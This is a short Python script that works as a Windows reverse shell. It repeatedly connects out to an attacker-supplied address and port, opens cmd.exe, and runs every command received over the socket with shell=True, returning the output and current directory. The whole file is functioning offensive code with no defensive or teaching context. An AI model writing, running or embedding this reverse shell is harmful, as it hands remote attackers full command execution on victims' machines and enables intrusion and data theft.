import socket,subprocess,os,sys,time,getopt
port=-1
address=""
expectedArgument = len(('-a','-p')) #list of neded argument

#try to revers connect to client, return true if connection is enstablished, false if not
def tryConnection(sock, address):
    try:
        sock.connect(address)
        return True
    except:
        return False

#try every delay second to connect
def waitForConnection(sock, address, delay):
    connect = False
    while not connect:
        connect = tryConnection(sock, address)
        time.sleep(delay)
#parse input param
def getParam():
    global address
    global port

    if not len(sys.argv[1:]):
        sys.exit(0)
    try:
        op,ar = getopt.getopt(sys.argv[1:],"a:p:",["address=","port="])
    except:
        sys.exit(0)

    noOptionalArg=0
    for o,a in op:
        if o in ('-a','--address'):
            noOptionalArg+=1
            address = a
        elif o in ('-p','--port'):
            noOptionalArg+=1
            port = int(a)        

    if noOptionalArg != expectedArgument:
        sys.exit(0)

if __name__ == "__main__":
    getParam()
    
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    waitForConnection(client,(address,port),1)
    cm = subprocess.Popen("cmd.exe",stdin=subprocess.PIPE,stdout=subprocess.PIPE)
    client.sendall(cm.communicate()[0])

    while True:
        try:
            command = client.recv(4096).decode("utf-8")
        except:
            client.close()
            sys.exit(0)
        if not command:
            client.close()
            sys.exit(0)
        if len(command)>0:
            cmd = subprocess.Popen(command,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,text=True)
            out, err = cmd.communicate()
            if command[:2]=="cd":
                try:
                    os.chdir(command[2:].replace(" ","",1))
                except:
                    pass
            client.sendall((out + err + "\n" + os.getcwd() + ">").encode("utf-8"))

